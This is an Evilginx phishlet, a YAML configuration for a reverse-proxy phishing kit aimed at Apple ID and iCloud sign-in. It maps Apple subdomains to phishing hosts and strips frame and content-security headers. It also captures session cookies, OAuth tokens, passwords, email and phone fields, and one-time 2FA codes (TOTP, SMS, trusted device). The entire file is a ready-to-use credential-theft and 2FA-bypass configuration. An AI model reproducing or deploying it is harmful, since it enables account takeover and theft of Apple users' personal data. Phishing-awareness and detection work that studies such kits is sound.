min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://appleid.apple.com/'

proxy_hosts:
  - {phish_sub: 'appleid', orig_sub: 'appleid', domain: 'apple.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'icloud.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'idmsa', orig_sub: 'idmsa', domain: 'apple.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'setup', orig_sub: 'setup', domain: 'apple.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'iforgot', orig_sub: 'iforgot', domain: 'apple.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'apple.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Apple ID domain URLs
  - {triggers_on: 'appleid.apple.com', orig_sub: 'appleid', domain: 'apple.com', search: 'https://appleid\\.apple\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'appleid.apple.com', orig_sub: 'www', domain: 'icloud.com', search: 'https://www\\.icloud\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'appleid.apple.com', orig_sub: 'idmsa', domain: 'apple.com', search: 'https://idmsa\\.apple\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'appleid.apple.com', orig_sub: 'setup', domain: 'apple.com', search: 'https://setup\\.apple\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'appleid.apple.com', orig_sub: 'iforgot', domain: 'apple.com', search: 'https://iforgot\\.apple\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'appleid.apple.com', orig_sub: 'cdn', domain: 'apple.com', search: 'https://[a-z0-9-]+\\.apple\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'appleid.apple.com', orig_sub: 'appleid', domain: 'apple.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'appleid.apple.com', orig_sub: 'appleid', domain: 'apple.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'appleid.apple.com', orig_sub: 'www', domain: 'icloud.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'appleid.apple.com', orig_sub: 'www', domain: 'icloud.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Apple/iCloud authentication cookies
  - domain: '.apple.com'
    keys: ['dslang', 'myacinfo', 'aasp', 'aasp_*', 'dqsid', 'idmsa_session_id']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.apple.com'
    keys: ['apz', 'apz_*', 'JSESSIONID', 'X-Apple-WebKit-WebAuth']
    type: 'cookie'
    optional: true
  
  # iCloud-specific cookies
  - domain: '.icloud.com'
    keys: ['X-Apple-WebKit-WebAuth', 'X-Apple-WebKit-WebAuth-User', 'X-Apple-WebKit-WebAuth-Session']
    type: 'cookie'
    optional: true
  
  # OAuth tokens
  - domain: '.apple.com'
    keys: ['oauth_token', 'oauth_token_secret', 'access_token', 'refresh_token']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'appleId'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # Alternative email field
  email:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  # Phone number field
  phone:
    key: 'phoneNumber'
    search: '(.*)'
    type: 'post'
  
  # 2FA codes
  totp_code:
    key: 'code'
    search: '(.*)'
    type: 'post'
  
  # SMS codes
  sms_code:
    key: 'smsCode'
    search: '(.*)'
    type: 'post'
  
  # Trusted device verification
  trusted_device:
    key: 'trustedDevice'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/account/manage'
  - '^/account/home'
  - '^/account/settings'
  - '^/account/security'
  - '^/icloud'
  - '^/mail'
  - '^/contacts'
  - '^/calendar'

login:
  domain: 'appleid.apple.com'
  path: '/account/signin'

